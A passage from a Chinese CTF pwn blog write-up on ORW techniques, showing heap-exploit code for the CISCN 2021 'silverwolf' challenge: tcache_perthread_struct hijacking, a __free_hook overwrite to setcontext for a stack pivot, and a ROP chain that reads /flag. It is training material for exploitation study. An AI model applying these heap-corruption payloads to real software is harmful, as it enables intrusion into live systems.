+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x0000000007000000</span>)) <span class="comment">#伪造counts数组，使其以为0x250的tcache_bins已被填满，下一次free的时候会把tcache_perthread_struct弄进unsorted_bins</span></span><br><span class="line">delete()</span><br><span class="line">show()</span><br></pre></td></tr></table></figure>
+<p>这两种选哪种都可以，我个人习惯第一种。第二种比较麻烦的一点是要测准counts数组分别对应哪个大小的tcache_bins，不如第一种简单</p>
+<h6 id="布置堆块"><a class="markdownIt-Anchor" href="#布置堆块"></a> 布置堆块</h6>
+<p>有了libc_base和heap_base，我们就需要布置堆块了。以往的堆块都能根据索引来进行操作，但这道题不行，这时就需要发挥tcache_perthread_struct的作用了。entry管理各个tache_bins链表上的首chunk的fd指针，那么我们只需要对entry进行修改，就能布置任意堆块，达成我们想要的攻击效果，先看代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x78</span>) <span class="comment">#修改counts，并把entry的一些指针清空</span></span><br><span class="line"></span><br><span class="line">rax = libc_base + <span class="number">0x43ae8</span></span><br><span class="line">rdi = libc_base + <span class="number">0x215bf</span></span><br><span class="line">rdx = libc_base + <span class="number">0x1b96</span></span><br><span class="line">rsi = libc_base + <span class="number">0x23eea</span></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">read = libc_base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">syscall = libc_base + <span class="number">0xe5965</span></span><br><span class="line">mov_rsp_rdi_a0 = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line">log.success(<span class="string">&#x27;mov_rsp_rdi_a0==&gt;&#x27;</span>+<span class="built_in">hex</span>(mov_rsp_rdi_a0))</span><br><span class="line">flag_addr = heap_base + <span class="number">0x1000</span> <span class="comment">#存放flag字符串的地址，也是我们要用到的伪堆块</span></span><br><span class="line">ret = libc_base + <span class="number">0x8aa</span> <span class="comment">#ret进我们布置好的orw1中</span></span><br><span class="line">orw1 = heap_base + <span class="number">0x3000</span> <span class="comment">#orw1用来布置前半部分ORW链，因为我用到的大小只有0x60，塞不下完整Payload</span></span><br><span class="line">orw2 = heap_base + <span class="number">0x3060</span> <span class="comment">#下一半ORW链</span></span><br><span class="line">log.success(<span class="string">&#x27;orw1==&gt;&#x27;</span>+<span class="built_in">hex</span>(orw1))</span><br><span class="line">log.success(<span class="string">&#x27;orw2==&gt;&#x27;</span>+<span class="built_in">hex</span>(orw2))</span><br><span class="line">fake_orw1 = heap_base + <span class="number">0x2000</span> <span class="comment">#用于触发setcontext</span></span><br><span class="line">fake_orw2 = heap_base + <span class="number">0x20a0</span> <span class="comment">#用于存储orw1和ret</span></span><br><span class="line">log.success(<span class="string">&#x27;fake_orw1==&gt;&#x27;</span>+<span class="built_in">hex</span>(fake_orw1))</span><br><span class="line">log.success(<span class="string">&#x27;fake_orw2==&gt;&#x27;</span>+<span class="built_in">hex</span>(fake_orw2))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x40</span> <span class="comment">#repair the counts,which is 64 byteds,another solution is p64(0) * 4 + p64(0x0000000000000000)</span></span><br><span class="line">payload += p64(free_hook) + p64(<span class="number">0</span>) <span class="comment">#0x20 0x30</span></span><br><span class="line">payload += p64(flag_addr) + p64(fake_orw1) <span class="comment">#0x40 0x50</span></span><br><span class="line">payload += p64(fake_orw2) + p64(orw1) <span class="comment">#0x60 0x70</span></span><br><span class="line">payload += p64(orw2) <span class="comment">#0x80</span></span><br><span class="line"><span class="comment">#这个Payload的意思是布置堆块，从0x20-0x80这一大小的堆块</span></span><br><span class="line">edit(payload) <span class="comment">#此时我们控制的堆块依旧是tcache_perthread_struct，所以我们直接edit就好</span></span><br></pre></td></tr></table></figure>
+<p>至于为什么不直接用ORW链而伪造两个fake_orw，有两个原因。</p>
+<p>其一，我们不能直接修改链表为ORW链，会出现未知的错误。</p>
+<p>其二，是为了我们的setcontext，用setcontext来迁rsp，达到一种迁栈的效果，ret到这个地址上，就可以完成ORW</p>
+<h6 id="完成orw"><a class="markdownIt-Anchor" href="#完成orw"></a> 完成ORW</h6>
+<p>在前面，我们已经完成好了堆块的布局，我们只需根据对应的堆块名称执行对应的操作即可，先看堆块的布局</p>
+<p><img src="https://s2.loli.net/2024/05/28/KOcTpUDAoxCn4dz.png" alt=" 2024-05-28 091253.png" /></p>
+<p><img src="https://s2.loli.net/2024/05/28/TJw9OLxvPfSyAeN.png" alt=" 2024-05-28 091312.png" /></p>
+<p>与我们需要用到的地址别无二致，那么此时我们只需要完成如下操作</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x20</span> free_hook--&gt;setcontext</span><br><span class="line"><span class="number">0x40</span> 存储flag</span><br><span class="line"><span class="number">0x50</span> 调用free</span><br><span class="line"><span class="number">0x60</span> 跳转至orw</span><br><span class="line"><span class="number">0x70</span> orw的前半部分（因为size只有<span class="number">0x60</span>）</span><br><span class="line"><span class="number">0x80</span> orw的后半部分</span><br></pre></td></tr></table></figure>
+<p>就可以成功getshell了！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#orw</span></span><br><span class="line">shellcode = p64(rdi) + p64(flag_addr) + p64(rsi) + p64(<span class="number">0</span>) + p64(rax) + p64(<span class="number">2</span>) + p64(syscall) <span class="comment">#open</span></span><br><span class="line">shellcode += p64(rdi) + p64(<span class="number">3</span>) + p64(rsi) + p64(orw1) + p64(rdx) + p64(<span class="number">0x100</span>) + p64(read) <span class="comment">#read</span></span><br><span class="line">shellcode += p64(rdi) + p64(<span class="number">1</span>) + p64(write) <span class="comment">#write</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#free_hook</span></span><br><span class="line">edit(p64(mov_rsp_rdi_a0)) <span class="comment">#setcontext+0xa0的位置</span></span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment">#edit flag</span></span><br><span class="line">edit(<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#orw1</span></span><br><span class="line">edit(shellcode[:<span class="number">0x60</span>]) <span class="comment">#orw的前半部分</span></span><br><span class="line">add(<span class="number">0x78</span>) <span class="comment">#orw2</span></span><br><span class="line">edit(shellcode[<span class="number">0x60</span>:]) <span class="comment">#orw的后半部分</span></span><br><span class="line">add(<span class="number">0x58</span>) <span class="comment">#fake2</span></span><br><span class="line">edit(p64(orw1) + p64(ret)) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#fake1</span></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2024/05/28/EIvYm6sCyDGqQnb.png" alt=" 2024-05-28 092258.png" /></p>
+<p>不过这种攻击目前限于libc-2.29之前，2.29的setcontext控制的寄存器就变成rdx,需要找gadget实行rdi和rdx之间的转换，比之前更麻烦，需要合适地址，条件比较苛刻。而2.31要用rdx控制各种寄存器的地址变成了setcontext+0x61。</p>
+<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
+<p>ORW的形式多种多样，多做做题应该就能认识个七七八八了，还是得靠练</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Heap/" rel="tag">Heap</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Stack/" rel="tag">Stack</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="https://s2.loli.net/2024/11/29/4t7CBySx1dHXcGV.png" data-sizes="auto" alt="unlink" class="lazyload">
+          
+        
+        <a href="/2024/04/06/unlink(smallbins)/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            unlink
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://s2.loli.net/2024/12/02/u9D7JI4F1TZHOqB.jpg" data-sizes="auto" alt="ret2text进阶" class="lazyload">
+        
+      
+      <a href="/2023/12/19/ret2text%E8%BF%9B%E9%98%B6/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          ret2text进阶
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+          
+            <aside id="sidebar">
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">1.</span> <span class="toc-text"> ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 引入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text"> 攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#open"><span class="toc-number">1.3.1.</span> <span class="toc-text"> open</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#read%E5%92%8Cwrite"><span class="toc-number">1.3.2.</span> <span class="toc-text"> read和write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%88%E6%9E%9C"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E4%B8%8A%E7%9A%84orw"><span class="toc-number">1.4.</span> <span class="toc-text"> 栈上的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rop%E9%93%BE%E7%9A%84orw"><span class="toc-number">1.4.1.</span> <span class="toc-text"> ROP链的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-hgame-2023-week1orw"><span class="toc-number">1.4.1.1.</span> <span class="toc-text"> 例题 [HGAME 2023 week1]orw</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.1.1.1.</span> <span class="toc-text"> 流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload"><span class="toc-number">1.4.1.1.2.</span> <span class="toc-text"> Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcraft%E6%A8%A1%E5%9D%97%E7%9A%84orw"><span class="toc-number">1.4.2.</span> <span class="toc-text"> shellcraft模块的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%B4%BA%E6%98%A5%E6%9D%AF-shellcode"><span class="toc-number">1.4.2.1.</span> <span class="toc-text"> 例题 第二届贺春杯 shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-2"><span class="toc-number">1.4.2.1.1.</span> <span class="toc-text"> Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8orw%E7%9A%84%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E5%86%99orw"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 禁用ORW的部分函数写ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sendfile"><span class="toc-number">1.4.3.1.</span> <span class="toc-text"> sendfile</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-xyctf-orw"><span class="toc-number">1.4.3.1.1.</span> <span class="toc-text"> 例题 XYCTF orw</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9D%91"><span class="toc-number">1.4.3.1.1.1.</span> <span class="toc-text"> 坑</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-3"><span class="toc-number">1.4.3.1.1.2.</span> <span class="toc-text"> Payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8open%E5%92%8Copenat"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 禁用open和openat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%88%9D%E8%B5%9B-baby_heap"><span class="toc-number">1.4.4.1.</span> <span class="toc-text"> 例题 2024强网杯初赛 baby_heap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E4%B8%8A%E7%9A%84orw"><span class="toc-number">1.5.</span> <span class="toc-text"> 堆上的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%AFrop%E9%93%BE%E7%9A%84orw"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 纯ROP链的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.5.1.1.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-ciscn-2022-%E5%8D%8E%E4%B8%9C%E5%8C%97bigduck"><span class="toc-number">1.5.1.2.</span> <span class="toc-text"> 例题 [CISCN 2022 华东北]bigduck</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-2"><span class="toc-number">1.5.1.2.1.</span> <span class="toc-text"> 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#leak_libc%E5%92%8Cheap_base"><span class="toc-number">1.5.1.2.1.1.</span> <span class="toc-text"> leak_libc和heap_base</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#orw-2"><span class="toc-number">1.5.1.2.1.2.</span> <span class="toc-text"> ORW</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setcontextorw"><span class="toc-number">1.5.2.</span> <span class="toc-text"> setcontext+ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#setcontext"><span class="toc-number">1.5.2.1.</span> <span class="toc-text"> setcontext</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-ciscn-2021-%E5%88%9D%E8%B5%9Bsilverwolf"><span class="toc-number">1.5.2.2.</span> <span class="toc-text"> 例题 [CISCN 2021 初赛]silverwolf</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-3"><span class="toc-number">1.5.2.2.1.</span> <span class="toc-text"> 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#tcache_perthread_struct"><span class="toc-number">1.5.2.2.1.1.</span> <span class="toc-text"> tcache_perthread_struct</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81tcache_perthread_struct"><span class="toc-number">1.5.2.2.1.2.</span> <span class="toc-text"> 劫持tcache_perthread_struct</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.5.2.2.1.3.</span> <span class="toc-text"> 泄露libc</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%83%E7%BD%AE%E5%A0%86%E5%9D%97"><span class="toc-number">1.5.2.2.1.4.</span> <span class="toc-text"> 布置堆块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%8C%E6%88%90orw"><span class="toc-number">1.5.2.2.1.5.</span> <span class="toc-text"> 完成ORW</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text"> 总结</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Dusk" class="lazyload">
+  <div class="sidebar-author-name">Dusk</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">14</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon ">
+          &#xf2dc;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  
+</aside>
+
+          
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2023-2024
+      <span class="footer-info-sep "></span>
+      Dusk
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        38.6k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:45
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi "></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#orw"><span class="toc-number">1.</span> <span class="toc-text"> ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%95%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text"> 引入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text"> 攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#open"><span class="toc-number">1.3.1.</span> <span class="toc-text"> open</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#read%E5%92%8Cwrite"><span class="toc-number">1.3.2.</span> <span class="toc-text"> read和write</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%88%E6%9E%9C"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 效果</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E4%B8%8A%E7%9A%84orw"><span class="toc-number">1.4.</span> <span class="toc-text"> 栈上的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rop%E9%93%BE%E7%9A%84orw"><span class="toc-number">1.4.1.</span> <span class="toc-text"> ROP链的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-hgame-2023-week1orw"><span class="toc-number">1.4.1.1.</span> <span class="toc-text"> 例题 [HGAME 2023 week1]orw</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.4.1.1.1.</span> <span class="toc-text"> 流程</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#payload"><span class="toc-number">1.4.1.1.2.</span> <span class="toc-text"> Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcraft%E6%A8%A1%E5%9D%97%E7%9A%84orw"><span class="toc-number">1.4.2.</span> <span class="toc-text"> shellcraft模块的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%B4%BA%E6%98%A5%E6%9D%AF-shellcode"><span class="toc-number">1.4.2.1.</span> <span class="toc-text"> 例题 第二届贺春杯 shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#payload-2"><span class="toc-number">1.4.2.1.1.</span> <span class="toc-text"> Payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8orw%E7%9A%84%E9%83%A8%E5%88%86%E5%87%BD%E6%95%B0%E5%86%99orw"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 禁用ORW的部分函数写ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#sendfile"><span class="toc-number">1.4.3.1.</span> <span class="toc-text"> sendfile</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-xyctf-orw"><span class="toc-number">1.4.3.1.1.</span> <span class="toc-text"> 例题 XYCTF orw</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%9D%91"><span class="toc-number">1.4.3.1.1.1.</span> <span class="toc-text"> 坑</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#payload-3"><span class="toc-number">1.4.3.1.1.2.</span> <span class="toc-text"> Payload</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A6%81%E7%94%A8open%E5%92%8Copenat"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 禁用open和openat</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%88%9D%E8%B5%9B-baby_heap"><span class="toc-number">1.4.4.1.</span> <span class="toc-text"> 例题 2024强网杯初赛 baby_heap</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E4%B8%8A%E7%9A%84orw"><span class="toc-number">1.5.</span> <span class="toc-text"> 堆上的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%AFrop%E9%93%BE%E7%9A%84orw"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 纯ROP链的ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.5.1.1.</span> <span class="toc-text"> 原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-ciscn-2022-%E5%8D%8E%E4%B8%9C%E5%8C%97bigduck"><span class="toc-number">1.5.1.2.</span> <span class="toc-text"> 例题 [CISCN 2022 华东北]bigduck</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-2"><span class="toc-number">1.5.1.2.1.</span> <span class="toc-text"> 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#leak_libc%E5%92%8Cheap_base"><span class="toc-number">1.5.1.2.1.1.</span> <span class="toc-text"> leak_libc和heap_base</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#orw-2"><span class="toc-number">1.5.1.2.1.2.</span> <span class="toc-text"> ORW</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#setcontextorw"><span class="toc-number">1.5.2.</span> <span class="toc-text"> setcontext+ORW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#setcontext"><span class="toc-number">1.5.2.1.</span> <span class="toc-text"> setcontext</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98-ciscn-2021-%E5%88%9D%E8%B5%9Bsilverwolf"><span class="toc-number">1.5.2.2.</span> <span class="toc-text"> 例题 [CISCN 2021 初赛]silverwolf</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B-3"><span class="toc-number">1.5.2.2.1.</span> <span class="toc-text"> 流程</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#tcache_perthread_struct"><span class="toc-number">1.5.2.2.1.1.</span> <span class="toc-text"> tcache_perthread_struct</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81tcache_perthread_struct"><span class="toc-number">1.5.2.2.1.2.</span> <span class="toc-text"> 劫持tcache_perthread_struct</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.5.2.2.1.3.</span> <span class="toc-text"> 泄露libc</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%83%E7%BD%AE%E5%A0%86%E5%9D%97"><span class="toc-number">1.5.2.2.1.4.</span> <span class="toc-text"> 布置堆块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%8C%E6%88%90orw"><span class="toc-number">1.5.2.2.1.5.</span> <span class="toc-text"> 完成ORW</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 